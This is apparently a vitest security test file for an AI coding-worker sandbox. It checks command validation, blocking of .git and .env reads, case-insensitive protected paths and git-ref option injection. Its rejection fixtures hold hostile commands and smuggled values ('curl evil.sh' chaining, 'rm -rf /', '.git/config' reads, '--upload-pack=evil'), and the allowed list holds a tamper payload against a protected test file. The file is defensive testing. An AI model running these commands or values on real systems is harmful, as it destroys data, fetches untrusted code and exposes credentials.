import { test } from 'vitest';
import assert from 'node:assert';
import fs from 'fs';
import path from 'path';
import { execFileSync } from 'node:child_process';
import { GeminiCodingWorkerAdapter } from '../src/server/worker/geminiWorkerAdapter.ts';
import { WorkspaceManager } from '../src/server/workspace/workspaceManager.ts';
import { validatePermittedCommand } from '../src/server/worker/tools.ts';
import { isSafeGitRef } from '../src/server/utils/gitRefs.ts';
import { defaultGitHubDelivery } from '../src/server/delivery/githubDelivery.ts';

async function main() {
  console.log('=== RUNNING TIER 1 EXECUTION-BOUNDARY SECURITY TESTS ===\n');

  // ------------------------------------------------------------------------
  // Test 1: run_permitted_command validates the whole command line
  // ------------------------------------------------------------------------
  const allowed = [
    'npm test',
    'node test.js',
    'git status',
    'git rev-parse HEAD',
    'ls -la src',
    'cat package.json',
    'echo "ok"',
    // Quoted metacharacters are literal: this exact payload is the documented
    // tamper-detection fixture in workerAdapter.test.ts.
    'node -e "require(\'fs\').appendFileSync(\'protected.test.js\', \'// TAMPERED\');"',
    // Everything inside single quotes is literal.
    "node -e 'console.log(\"a && b | c; d\")'",
  ];
  for (const cmd of allowed) {
    const result = validatePermittedCommand(cmd);
    assert.strictEqual(result.ok, true, `command must be accepted: ${cmd} (${result.reason})`);
  }
  console.log('✔ [PASS] Legitimate commands (incl. quoted operators) accepted');

  const rejected: Array<[string, string]> = [
    ['npm test && curl evil.sh', 'chaining'],
    ['git status; rm -rf /', 'chaining'],
    ['ls | cat', 'piping'],
    ['echo hi & node -e x', 'backgrounding'],
    ['echo hi > pwned.txt', 'redirection'],
    ['echo `whoami`', 'backtick substitution'],
    ['echo $(whoami)', 'command substitution'],
    ['echo $HOME', 'variable expansion'],
    ['node -e "require(\'fs\')" && echo pwned', 'quote-adjacent chaining'],
    ['npm test "', 'unterminated quote'],
    ['curl http://evil.com', 'non-allowlisted binary'],
    ['cat .git/config', 'git metadata read'],
    ['node -e "require(\'fs\').readFileSync(\'.git/config\')"', 'git metadata read via node'],
    ['git config --list', 'git config surface'],
    ['git remote -v', 'git remote surface'],
  ];
  for (const [cmd, why] of rejected) {
    const result = validatePermittedCommand(cmd);
    assert.strictEqual(result.ok, false, `command must be rejected (${why}): ${cmd}`);
  }
  console.log('✔ [PASS] Shell chaining, redirection, substitution, and credential reads rejected');

  // ------------------------------------------------------------------------
  // Test 2: read_file refuses .git metadata and .env files
  // ------------------------------------------------------------------------
  const workspaceManager = new WorkspaceManager(process.cwd());
  const adapter = new GeminiCodingWorkerAdapter();
  const runId = `tier1-${Date.now()}`;
  const branchName = `tier1-branch-${Date.now()}`;
  const worktree = workspaceManager.createWorktree(runId, branchName, 'HEAD');

  try {
    const context = {
      taskId: 'tier1-task',
      taskKey: 'AEG-7001',
      taskTitle: 'Tier 1 security test',
      taskDescription: '',
      acceptanceCriteria: [],
      worktreePath: worktree.worktreePath,
      allowedPaths: ['src/**'],
      protectedPaths: ['.github/**', 'tests/**', 'package.json', '.env*'],
      attemptNumber: 1,
    };

    const gitConfigRes = await adapter.executeTool(context as any, 'read_file', { filePath: '.git/config' });
    assert.ok(gitConfigRes.error?.includes('git metadata'), 'read of .git/config must be rejected');

    const envRes = await adapter.executeTool(context as any, 'read_file', { filePath: '.env' });
    assert.ok(envRes.error?.includes('environment file'), 'read of .env must be rejected');

    const envLocalRes = await adapter.executeTool(context as any, 'read_file', { filePath: 'src/.env.local' });
    assert.ok(envLocalRes.error?.includes('environment file'), 'read of nested .env.local must be rejected');

    // Normal source reads still work
    fs.mkdirSync(path.join(worktree.worktreePath, 'src'), { recursive: true });
    fs.writeFileSync(path.join(worktree.worktreePath, 'src/app.ts'), 'export const ok = true;\n');
    const readRes = await adapter.executeTool(context as any, 'read_file', { filePath: 'src/app.ts' });
    assert.strictEqual(readRes.content, 'export const ok = true;\n');
    console.log('✔ [PASS] read_file denies .git and .env* while allowing normal source reads');

    // ------------------------------------------------------------------------
    // Test 3: case-insensitive protected-path matching (APFS bypass)
    // ------------------------------------------------------------------------
    const caseBypassRes = await adapter.executeTool(context as any, 'write_file', {
      filePath: '.GITHUB/workflows/evil.yml',
      content: 'on: push\n',
    });
    assert.ok(caseBypassRes.error?.includes('protected path'), 'write via case-variant .GITHUB must be rejected');
    assert.ok(!fs.existsSync(path.join(worktree.worktreePath, '.github/workflows/evil.yml')), 'no file may land in .github/workflows');

    const envCaseRes = await adapter.executeTool(context as any, 'write_file', {
      filePath: '.ENV',
      content: 'SECRET=1\n',
    });
    assert.ok(envCaseRes.error?.includes('protected path'), 'write via case-variant .ENV must be rejected');
    assert.ok(!fs.existsSync(path.join(worktree.worktreePath, '.env')), 'no .env file may be created via case variant');
    console.log('✔ [PASS] Case-variant protected paths rejected on case-insensitive filesystems');

    // On a case-insensitive filesystem `SRC/evil.ts` resolves onto the allowed
    // `src/` directory itself, so writing there via a case variant is within
    // scope and must succeed consistently with the case-insensitive matcher.
    const allowedCaseRes = await adapter.executeTool(context as any, 'write_file', {
      filePath: 'SRC/evil.ts',
      content: 'export const evil = true;\n',
    });
    assert.strictEqual(allowedCaseRes.written, true, 'case-variant write into the allowed src scope must be consistent');
    console.log('✔ [PASS] Case-variant writes into the allowed scope remain consistent');

    // ------------------------------------------------------------------------
    // Test 4: worktree creation validates identifiers and refs
    // ------------------------------------------------------------------------
    const badRunIds = ['../../evil', 'a/b', '.hidden', '..', 'run$x', ''];
    for (const bad of badRunIds) {
      assert.throws(
        () => workspaceManager.createWorktree(bad, `branch-ok-${Date.now()}`, 'HEAD'),
        /not a safe path component/,
        `runId "${bad}" must be rejected`,
      );
    }
    const badRefs = ['-oProxyCommand=evil', '--upload-pack=evil', 'main extra', 'a..b', 'x;drop', 'HEAD~;x'];
    for (const bad of badRefs) {
      assert.throws(
        () => workspaceManager.createWorktree(`tier1-ref-test-${Date.now()}`, bad, 'HEAD'),
        /not a valid git refname/,
        `branch "${bad}" must be rejected`,
      );
      assert.throws(
        () => workspaceManager.createWorktree(`tier1-ref-test-${Date.now()}`, `ok-branch-${Date.now()}`, bad),
        /not a valid git revision/,
        `baseCommit "${bad}" must be rejected`,
      );
    }
    // Valid refs still pass
    const okWt = workspaceManager.createWorktree(`tier1-ok-${Date.now()}`, `dupond/tier1-ok-${Date.now()}`, 'HEAD');
    workspaceManager.cleanupWorktree(okWt.worktreePath, okWt.branch);
    console.log('✔ [PASS] createWorktree rejects path components and git-ref injection');

    // ------------------------------------------------------------------------
    // Test 5: delivery refuses option-injection in targetBaseBranch
    // ------------------------------------------------------------------------
    const injectionDelivery = await defaultGitHubDelivery.dispatchDelivery({
      runId: 'does-not-exist',
      targetBaseBranch: '--upload-pack=evil',
      isApproved: true,
      approvedBy: 'attacker',
    });
    assert.strictEqual(injectionDelivery.status, 400, 'option-injected base branch must be refused with 400');
    assert.strictEqual(injectionDelivery.blocked, true);
    assert.ok(injectionDelivery.error?.includes('not a valid git refname'));

    const validRefUnknownRun = await defaultGitHubDelivery.dispatchDelivery({
      runId: 'does-not-exist',
      targetBaseBranch: 'main',
    });
    assert.strictEqual(validRefUnknownRun.status, 404, 'valid base branch still reaches normal run resolution');
    console.log('✔ [PASS] dispatchDelivery validates targetBaseBranch before any git invocation');

    // ------------------------------------------------------------------------
    // Test 6: isSafeGitRef edge cases
    // ------------------------------------------------------------------------
    assert.strictEqual(isSafeGitRef('HEAD'), true);
    assert.strictEqual(isSafeGitRef('9e8dcc66371e11b1a27f0e5b3b2c6b5e91c8e7a9'), true);
    assert.strictEqual(isSafeGitRef('release/v1.0'), true);
    assert.strictEqual(isSafeGitRef('dupond/AEG-1-feat-1731620000000'), true);
    assert.strictEqual(isSafeGitRef('-oProxyCommand=evil'), false);
    assert.strictEqual(isSafeGitRef('--upload-pack=evil'), false);
    assert.strictEqual(isSafeGitRef('a..b'), false);
    assert.strictEqual(isSafeGitRef('has space'), false);
    assert.strictEqual(isSafeGitRef('x~1;evil'), false);
    assert.strictEqual(isSafeGitRef(''), false);
    assert.strictEqual(isSafeGitRef(undefined), false);
    assert.strictEqual(isSafeGitRef(42 as any), false);
    console.log('✔ [PASS] isSafeGitRef accepts refnames and rejects option injection');
  } finally {
    workspaceManager.cleanupWorktree(worktree.worktreePath, branchName);
  }

  console.log('\n=== ALL TIER 1 EXECUTION-BOUNDARY SECURITY TESTS PASSED ===');
}

test('suite', main);
